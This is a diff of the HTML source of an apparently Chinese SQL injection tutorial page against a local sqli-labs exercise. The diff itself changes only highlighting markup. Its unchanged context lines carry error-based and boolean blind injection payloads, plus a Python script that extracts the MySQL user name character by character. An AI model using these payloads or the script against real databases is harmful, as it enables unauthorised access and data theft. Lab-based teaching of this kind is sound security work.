@@ -50,8 +50,8 @@
 <code>select * from users where id=1 and !(select*from(select user())x)+~0</code>
 地址栏输入这样的语句
 <code>2' and !(select*from(select+user())x)%2b~0</code>(注意单引号闭合，如果没有闭合还是出现正常的结果。</p>
-<div class="highlight"><pre><span></span><span class="err">本文的攻击之所以得逞，是因为</span><span class="n">mysql_error</span><span class="p">()</span><span class="err">会向我们返回错误消息，只要这样，我们才能够利用它来进行注入。</span> <span class="err">这一功能，是在</span><span class="mi">5</span><span class="p">.</span><span class="mi">5</span><span class="p">.</span><span class="mi">5</span><span class="err">及其以上版本提供的。</span>
-</pre></div>
+<div class="highlight"><pre><span></span><code><span class="err">本文的攻击之所以得逞，是因为mysql_error()会向我们返回错误消息，只要这样，我们才能够利用它来进行注入。 这一功能，是在5.5.5及其以上版本提供的。</span>
+</code></pre></div>
 
 
 <p>source:<a href="http://drops.wooyun.org/web/8024">http://drops.wooyun.org/web/8024</a></p>
@@ -85,7 +85,7 @@ source:<a href="http://drops.wooyun.org/tips/8166">http://drops.wooyun.org/tips/
 判断长度:<code>And (select length(user()))=12</code>
 判断字符:<code>And (select ASCII(SUBSTR(user(),7,1)))&gt;99</code>
 这种可以写个脚本：</p>
-<div class="highlight"><pre><span></span><span class="ch">#!/usr/bin/env python</span>
+<div class="highlight"><pre><span></span><code><span class="ch">#!/usr/bin/env python</span>
 <span class="c1"># coding:utf-8</span>
 
 <span class="kn">import</span> <span class="nn">time</span>
@@ -98,7 +98,7 @@ source:<a href="http://drops.wooyun.org/tips/8166">http://drops.wooyun.org/tips/
            <span class="s1">&#39;User-Agent&#39;</span><span class="p">:</span> <span class="s1">&#39;Googlebot/2.1 (+http://www.googlebot.com/bot.html)&#39;</span><span class="p">}</span>
 
 <span class="n">payloads</span> <span class="o">=</span> <span class="s1">&#39;abcdefghijklmnopqrstuvwxyz0123456789@_.&#39;</span>
-<span class="k">print</span> <span class="s1">&#39;[</span><span class="si">%s</span><span class="s1">] Start to retrive MySQL User:&#39;</span> <span class="o">%</span> <span class="n">time</span><span class="o">.</span><span class="n">strftime</span><span class="p">(</span><span class="s1">&#39;%H:%M:%S&#39;</span><span class="p">,</span> <span class="n">time</span><span class="o">.</span><span class="n">localtime</span><span class="p">())</span>
+<span class="nb">print</span> <span class="s1">&#39;[</span><span class="si">%s</span><span class="s1">] Start to retrive MySQL User:&#39;</span> <span class="o">%</span> <span class="n">time</span><span class="o">.</span><span class="n">strftime</span><span class="p">(</span><span class="s1">&#39;%H:%M:%S&#39;</span><span class="p">,</span> <span class="n">time</span><span class="o">.</span><span class="n">localtime</span><span class="p">())</span>
 <span class="n">user</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
 
 <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">16</span><span class="p">):</span>
@@ -107,16 +107,16 @@ source:<a href="http://drops.wooyun.org/tips/8166">http://drops.wooyun.org/tips/
         <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;http://127.0.0.1:8080/sqli-labs/Less-1/?id=2 and%20&#39;</span> <span class="o">+</span> <span class="n">s</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">)</span>
         <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">content</span><span class="p">)</span> <span class="o">==</span> <span class="mi">49639</span><span class="p">:</span>
             <span class="n">user</span> <span class="o">+=</span> <span class="n">payload</span>
-            <span class="k">print</span> <span class="s1">&#39;</span><span class="se">\n</span><span class="s1">[Scan in progress]&#39;</span> <span class="o">+</span> <span class="n">user</span>
+            <span class="nb">print</span> <span class="s1">&#39;</span><span class="se">\n</span><span class="s1">[Scan in progress]&#39;</span> <span class="o">+</span> <span class="n">user</span>
             <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
             <span class="k">break</span>
         <span class="k">else</span><span class="p">:</span>
-            <span class="k">print</span> <span class="s1">&#39;.&#39;</span><span class="p">,</span>
-            <span class="k">print</span> <span class="s1">&#39;http://127.0.0.1:8080/sqli-labs/Less-1/?id=2 and%20&#39;</span> <span class="o">+</span> <span class="n">s</span> <span class="o">+</span> <span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span>
-            <span class="k">print</span> <span class="nb">len</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">content</span><span class="p">)</span>
+            <span class="nb">print</span> <span class="s1">&#39;.&#39;</span><span class="p">,</span>
+            <span class="nb">print</span> <span class="s1">&#39;http://127.0.0.1:8080/sqli-labs/Less-1/?id=2 and%20&#39;</span> <span class="o">+</span> <span class="n">s</span> <span class="o">+</span> <span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span>
+            <span class="nb">print</span> <span class="nb">len</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">content</span><span class="p">)</span>
             <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
-<span class="k">print</span> <span class="s1">&#39;</span><span class="se">\n</span><span class="s1">[Done]MySQL user is &#39;</span> <span class="o">+</span> <span class="n">user</span>
-</pre></div>
+<span class="nb">print</span> <span class="s1">&#39;</span><span class="se">\n</span><span class="s1">[Done]MySQL user is &#39;</span> <span class="o">+</span> <span class="n">user</span>
+</code></pre></div>
 
 
 <p>判断那里可以写返回的文本长度或者<code>r.content.find('something')&gt;0</code></p>
